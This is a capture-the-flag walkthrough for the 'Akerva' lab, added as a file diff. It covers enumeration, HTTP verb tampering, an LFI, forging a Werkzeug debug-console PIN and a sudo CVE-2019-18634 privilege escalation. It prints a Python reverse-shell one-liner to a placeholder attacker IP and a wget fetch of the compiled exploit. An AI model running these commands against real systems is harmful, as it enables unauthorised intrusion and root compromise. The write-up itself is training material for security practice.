@@ -1,0 +1,228 @@
+Fortress: Arkeva
+ip: 10.13.37.11
+
+
+When we go to the website, we look the source code, we find the first flag.
+the nmap come out, we have:
+22/ssh openssh 7.6p1
+80/http  Apache httpd 2.4.29 WordPress 5.4-alpha-47225 
+And that the os is linux.
+
+A little enumeration with ffuf gives 
+```
+.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3601ms]                                .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3603ms]                                .hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4625ms]                        
+backups                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 99ms]                                  
+dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 94ms]                                  
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 137ms]                                     
+javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 95ms]  
+scripts                 [Status: 401, Size: 458, Words: 42, Lines: 15, Duration: 99ms]                                
+server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 96ms]                               
+wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 87ms]                                  
+wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 88ms]                                  
+wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 91ms]                                  
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 125ms]
+```
+Another fuzzing at wp-content gives us
+themes, plugins, uploads, upgrade
+
+we redo the enumeration of the base with a different list and we find one more directory scripts/
+```bash
+wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 108ms]
+dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 144ms]
+javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 163ms]
+wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 2034ms]
+backups                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 127ms]
+wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 5033ms]
+scripts                 [Status: 401, Size: 458, Words: 42, Lines: 15, Duration: 4967ms]
+server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 111ms]
+```
+When we look at scripts/ it ask some credentials.
+
+When I use wp-plugins list, i find wp-content/plugins/akismet/.
+
+We back to enumerate udp connections(nmap -sU 10.13.37.11 ), and do snmp-check -c public -v 2c -d 10.13.37.11.
+And we get interesting informations --> snmp_output
+We find the second flag in this extrait:
+```
+ 220   1032                  runnable              apache2               /usr/sbin/apache2     -k start
+ 221   1232                  runnable              cron                  /usr/sbin/CRON        -f
+ 222   1233                  runnable              cron                  /usr/sbin/CRON        -f
+ 223   1234                  runnable              sh                    /bin/sh               -c /opt/check_backup.sh
+ 224   1235                  runnable              sh                    /bin/sh               -c /opt/check_devSite.sh
+ 225   1236                  runnable              check_backup.sh       /bin/bash             /opt/check_backup.sh
+ 226   1237                  runnable              check_devSite.s       /bin/bash             /opt/check_devSite.sh
+ 227   1240                  runnable              backup_every_17       /bin/bash             /var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
+ 228   1241                  runnable              space_dev.py          /usr/bin/python       /var/www/html/dev/space_dev.py
+ 229   1246                  runnable              python                /usr/bin/python       /var/www/html/dev/space_dev.py
+```
+Now we know that there is those files `/scripts/backup_every_17minutes.sh and  /dev/space_dev.py`.
+
+Let's try to access them.
+We try to GET the first one, it says that you don't have permission to access this file; when i try to post the same one it render the third flag.
+```
+└──╼ $curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
+#!/bin/bash
+#
+# This script performs backups of production and development websites.
+# Backups are done every 17 minutes.
+#
+# AKERVA{IKNoW###VeRbTamper!nG_==}
+#
+
+SAVE_DIR=/var/www/html/backups
+
+while true
+do
+        ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
+        echo "Erasing old backups..."
+        rm -rf $SAVE_DIR/*
+
+        echo "Backuping..."
+        zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*
+
+        echo "Done..."
+        sleep 1020
+done
+```
+
+We know there is a backup file named backup_YYYYMMDDHHMMSS.zip and for the date we got in our response to request in Burp ( you can do curl -I http://10.13.37.11/ ).
+So we know the file is named backup_202606270616MMSS.zip and since the file is regenerated every 17 minutes and we don't know exactly when it started, we will brute-force the last ones digits as a gentleman.
+```
+$crunch 4 4 0123456789 -o crunch_backup_list.txt
+Crunch will now generate the following amount of data: 50000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 10000 
+
+crunch: 100% completed generating output
+```
+And we do a ffuf with that list:`ffuf -u http://10.13.37.11/backups/backup_202606270616FUZZ -w crunch_backup_list.txt -mc all-fc 404`
+we get 1021 fine ! we then download it with wget as `wget http://10.13.37.11/backups/backup_2026062706161021.zip`.
+And we get the backup !
+Now that we have the backup, let's go and for those files in backup.
+We see into the dev/space_dev.py and we got the fourth flag.
+ ```vi backup/var/www/html/dev/space_dev.py
+ 11         "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
+```
+Those seems to be the credentials to login.
+
+---
+===================================Open Book========================================
+Login using creds
+
+Just Hello World Message
+// Holy shit
+// trying to fuzz it
+
+python3 dirsearch.py -u http://10.13.37.11:5000/ -e php
+
+OR
+
+wfuzz -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
+
+They reveal three folders:
+200 - /console
+401 - /download
+401 - /file
+
+// /console reveals that there is a shell running under server
+// after reading space_dev.py, i found this @app.route("/file")
+// /file as a parameter filename which can open a file
+// trying to exploit this LFI
+http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
+http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt
+Flag 5 is AKERVA{IKNOW#LFi_@_}
+
+==================================Say Friend and Enter==============================
+// TCP port scanning reveals that port 5000 = Werkzeug httpd 0.16.0 (Python 2.7.15+)
+// Since /console ask a pin, i just search werkzeug console pin
+// i found these links
+https://werkzeug.palletsprojects.com/en/1.0.x/debug/
+https://www.daehee.com/werkzeug-console-pin-exploit/
+
+// The first one just show me that the pin is enabled by werkzeug , its a dependency that is being used to protect the running console with a pin
+// the second give me a script to get pin (saved to exploit.py)
+
+// I have to change username by aas and private_bits also
+// Use LFI to get /sys/class/net/ens33/address and /etc/machine-id
+// Replace it in the corresponding field
+258f132cd7e647caaf5510e3aca997c1
+00:50:56:b9:3c:f8
+// The first one gives me a MAC address but i have to convert it
+python
+>>> print(0x5056b93cf8)
+345052364024
+// save and run the exploit
+python exploit.py
+
+// key is 151-392-393
+// Now i'm in console
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+nc -lnvp 1234
+
+// Get connection back to my listener
+// This to get a better shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+aas@Leakage:~$ whoami
+whoami
+aas
+aas@Leakage:~$ hostname
+Leakage
+
+ls -la
+cat .hiddenflag.txt
+Flag 6 is AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
+
+=================================Super Mushroom=====================================
+aas@Leakage:~$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+
+When browsing, i found this https://github.com/saleemrashid/sudo-cve-2019-18634/
+// compile the c file and send it to machine
+gcc -o sudo sudo.c
+
+// on my machine: sudo python3 -m http.server 80
+
+// on victim's: wget http://IP/sudo
+run the file and get root shell
+python -c "import pty;pty.spawn('/bin/bash')"
+cd /root
+cat root.txt
+Flag 7 is AKERVA{IkNow_Sud0_sUckS!}
+
+================================Little secret=======================================
+cat secured_note.md
+R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
+UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
+U1BNSUhITU9EQVVLSEUK
+
+@AKERVA_FR | @lydericlefebvre
+
+// decode from base64 with cyberchef give:
+GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
+
+// Page on port 80 gives me hint
+// Use vegenere cipher from https://www.dcode.fr/vigenere-cipher to decode it
+// Nothing comprehensive
+// Maybe some letters missing
+// Check that with missing.py
+B J Q X Z   are missing
+// suppress them in dcode alphabet field
+// so final alphabet is ACDEFGHIKLMNOPRSTUVWY
+// The key is ILOVESPACE
+WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE
+
+WELL DONE FOR SOLVING THIS CHALLENGE YOU CAN SEND YOUR RESUME HERE AT RECRUTEMENT AKERVA COMAND VALIDATE THE LAST FLAG WITH AKERVAIKNOOOWVIGEEENERRRE
+
+Flag 8 is AKERVA{IKNOOOWVIGEEENERRRE}
+
+=====================================================================================
+---
+*-*
